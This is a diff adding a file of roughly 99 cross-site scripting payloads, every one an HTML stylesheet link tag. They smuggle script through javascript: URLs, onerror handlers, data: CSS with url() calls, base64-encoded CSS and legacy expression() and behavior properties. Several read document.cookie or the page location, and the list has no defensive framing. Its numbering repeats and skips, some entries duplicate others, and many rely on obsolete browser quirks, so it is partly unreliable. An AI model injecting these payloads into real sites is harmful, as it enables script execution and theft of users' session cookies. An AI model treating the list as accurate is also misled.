@@ -1,0 +1,99 @@
+<link href="javascript:alert(1)" rel="stylesheet">
+<link rel="stylesheet" href="javascript:alert(2)">
+<link href="x" onerror="alert(3)" rel="stylesheet">
+<link rel="stylesheet" href="data:text/css;base64,LmFjaXRpb24geyBjb250ZW50OiB1cmwoamF2YXNjcmlwdDphbGVydCgzKSk7IH0=">
+<link href="data:text/css,*{background:url(javascript:alert(5))}" rel="stylesheet">
+<link rel="stylesheet" href="data:text/css,body{background:url('javascript:alert(6)')}">
+<link rel="stylesheet" href="javascript:confirm(7)">
+<link href="javascript:prompt(8)" rel="stylesheet">
+<link rel="stylesheet" href="javascript:alert(document.domain)">
+<link rel="stylesheet" href="javascript:alert(document.cookie)">
+<link href="x" onerror="alert('XSS9')" rel="stylesheet">
+<link href="javascript:alert(String.fromCharCode(88,83,83))" rel="stylesheet">
+<link href="javascript:alert(document.URL)" rel="stylesheet">
+<link href="javascript:alert(navigator.userAgent)" rel="stylesheet">
+<link rel="stylesheet" href="javascript:alert(top.location)">
+<link href="javascript:alert(self.name)" rel="stylesheet">
+<link href="javascript:alert(document.referrer)" rel="stylesheet">
+<link href="javascript:alert(window.location.href)" rel="stylesheet">
+<link rel="stylesheet" href="javascript:alert(document.title)">
+<link href="javascript:alert(location.host)" rel="stylesheet">
+<link href="javascript:alert(document.body)" rel="stylesheet">
+<link rel="stylesheet" href="javascript:alert(history.length)">
+<link href="javascript:alert(location.pathname)" rel="stylesheet">
+<link href="javascript:alert(screen.width)" rel="stylesheet">
+<link href="javascript:alert(screen.height)" rel="stylesheet">
+<link href="javascript:alert(document.domain)" rel="stylesheet">
+<link rel="stylesheet" href="javascript:alert(document.baseURI)">
+<link href="javascript:alert(window.status)" rel="stylesheet">
+<link rel="stylesheet" href="javascript:alert(window.innerWidth)">
+<link href="javascript:alert(window.innerHeight)" rel="stylesheet">
+<link rel="stylesheet" href="javascript:alert(document.readyState)">
+<link href="javascript:alert(document.cookie.split('').reverse().join(''))" rel="stylesheet">
+<link href="javascript:alert(escape(document.cookie))" rel="stylesheet">
+<link href="javascript:alert(unescape(document.cookie))" rel="stylesheet">
+<link rel="stylesheet" href="javascript:alert('XSS via link tag')">
+<link href="javascript:alert('XSS 40')" rel="stylesheet">
+<link href="javascript:alert('XSS41')" rel="stylesheet" type="text/css">
+<link href="javascript:alert('XSS42')" rel="stylesheet" type="text/javascript">
+<link href="javascript:alert('XSS43')" rel="stylesheet" type="text/ecmascript">
+<link href="javascript:alert('XSS44')" rel="stylesheet" type="text/vbscript">
+<link href="javascript:alert('XSS45')" rel="stylesheet" type="application/javascript">
+<link href="javascript:alert('XSS46')" rel="stylesheet" media="screen">
+<link href="javascript:alert('XSS47')" rel="stylesheet" media="print">
+<link href="javascript:alert('XSS48')" rel="stylesheet" media="all">
+<link href="javascript:alert('XSS49')" rel="stylesheet" media="(min-width: 300px)">
+<link href="javascript:alert('XSS50')" rel="stylesheet" media="(max-width: 600px)">
+<link href="javascript:alert('XSS51')" rel="stylesheet" crossorigin="anonymous">
+<link href="javascript:alert('XSS52')" rel="stylesheet" integrity="">
+<link href="javascript:alert('XSS53')" rel="stylesheet" title="xss">
+<link href="javascript:alert('XSS54')" rel="stylesheet" disabled>
+<link href="javascript:alert('XSS55')" rel="stylesheet" hreflang="en">
+<link href="javascript:alert('XSS56')" rel="stylesheet" type="text/css" />
+<link href="javascript:alert('XSS57')" rel="stylesheet" type="text/css" media="screen" />
+<link href="javascript:alert('XSS58')" rel="stylesheet" type="text/css" media="print" />
+<link href="javascript:alert('XSS59')" rel="stylesheet" type="text/css" crossorigin="use-credentials" />
+<link href="javascript:alert('XSS60')" rel="stylesheet" type="text/css" crossorigin="anonymous" />
+<link href="javascript:alert('XSS61')" rel="stylesheet" type="text/css" integrity="" />
+<link href="javascript:alert('XSS62')" rel="stylesheet" title="xss" />
+<link href="javascript:alert('XSS63')" rel="stylesheet" disabled />
+<link href="javascript:alert('XSS64')" rel="stylesheet" hreflang="en" />
+<link href="data:text/css,*{background:url('javascript:alert(65)')}" rel="stylesheet" />
+<link href="data:text/css;base64,LmFjaXRpb24geyBjb250ZW50OiB1cmwoamF2YXNjcmlwdDphbGVydCgxNjUpKTsgfQ==" rel="stylesheet" />
+<link href="data:text/css,body{background:url('javascript:alert(67)')}" rel="stylesheet" />
+<link href="data:text/css,body{background-image:url('javascript:alert(68)')}" rel="stylesheet" />
+<link href="data:text/css,*{background:url(&quot;javascript:alert(69)&quot;)}" rel="stylesheet" />
+<link href="data:text/css,*{background:url(javascript:alert(70))}" rel="stylesheet" />
+<link href="data:text/css,*{content:url(javascript:alert(71))}" rel="stylesheet" />
+<link href="data:text/css,*{list-style-image:url(javascript:alert(72))}" rel="stylesheet" />
+<link href="data:text/css,*{cursor:url(javascript:alert(73))}" rel="stylesheet" />
+<link href="data:text/css,*{cursor:url(javascript:alert(74)),auto}" rel="stylesheet" />
+<link href="data:text/css,*{cursor:url(javascript:alert(75)),default}" rel="stylesheet" />
+<link href="data:text/css,*{background-image:url(javascript:alert(76))}" rel="stylesheet" />
+<link href="data:text/css,body{cursor:url(javascript:alert(77)),auto}" rel="stylesheet" />
+<link href="data:text/css,body{cursor:url(javascript:alert(78)),default}" rel="stylesheet" />
+<link href="data:text/css,*{behavior:url(javascript:alert(79))}" rel="stylesheet" />
+<link href="data:text/css,*{behavior:url(#default#VML)}" rel="stylesheet" />
+<link href="data:text/css,*{behavior:url(#default#clientBehavior)}" rel="stylesheet" />
+<link href="data:text/css,*{behavior:url(#default#clientData)}" rel="stylesheet" />
+<link href="data:text/css,*{expression(alert(80))}" rel="stylesheet" />
+<link href="data:text/css,body{width:expression(alert(81))}" rel="stylesheet" />
+<link href="data:text/css,body{height:expression(alert(82))}" rel="stylesheet" />
+<link href="data:text/css,*{content:'expression(alert(83))'}" rel="stylesheet" />
+<link href="data:text/css,*{background:expression(alert(84))}" rel="stylesheet" />
+<link href="data:text/css,*{behavior:url(javascript:alert(85))}" rel="stylesheet" />
+<link href="data:text/css,*{background:url(javascript:alert(86))}" rel="stylesheet" />
+<link href="data:text/css,*{background-image:url(javascript:alert(87))}" rel="stylesheet" />
+<link href="data:text/css,*{content:url(javascript:alert(88))}" rel="stylesheet" />
+<link href="data:text/css,*{cursor:url(javascript:alert(89))}" rel="stylesheet" />
+<link href="data:text/css,*{list-style-image:url(javascript:alert(90))}" rel="stylesheet" />
+<link href="data:text/css,*{behavior:url(javascript:alert(91))}" rel="stylesheet" />
+<link href="data:text/css,*{expression(alert(92))}" rel="stylesheet" />
+<link href="data:text/css,body{width:expression(alert(93))}" rel="stylesheet" />
+<link href="data:text/css,body{height:expression(alert(94))}" rel="stylesheet" />
+<link href="data:text/css,*{content:'expression(alert(95))'}" rel="stylesheet" />
+<link href="data:text/css,*{background:expression(alert(96))}" rel="stylesheet" />
+<link href="data:text/css,*{behavior:url(javascript:alert(97))}" rel="stylesheet" />
+<link href="data:text/css,*{background:url(javascript:alert(98))}" rel="stylesheet" />
+<link href="data:text/css,*{background-image:url(javascript:alert(99))}" rel="stylesheet" />
+<link href="data:text/css,*{content:url(javascript:alert(100))}" rel="stylesheet" />
